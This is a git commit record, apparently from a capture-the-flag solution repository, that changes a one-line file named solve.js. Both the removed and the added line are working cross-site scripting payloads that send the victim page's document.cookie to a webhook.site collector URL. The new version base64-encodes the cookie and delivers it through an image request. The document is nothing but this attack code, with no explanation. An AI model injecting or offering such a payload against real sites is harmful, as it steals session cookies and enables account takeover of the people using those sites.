d98bffd26320871ba8ffcf8f5aef9684ec77375a
c0mrad3 <106001817+aedicious@users.noreply.github.com>
2025-01-04 19:42:54 +0300

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/4dea91f9-3181-4bae-a70b-7744b639b4e0?cookie="+document.cookie);
+x = new Image(); x.src = 'https://webhook.site/4dea91f9-3181-4bae-a70b-7744b639b4e0?data='+btoa(document.cookie);
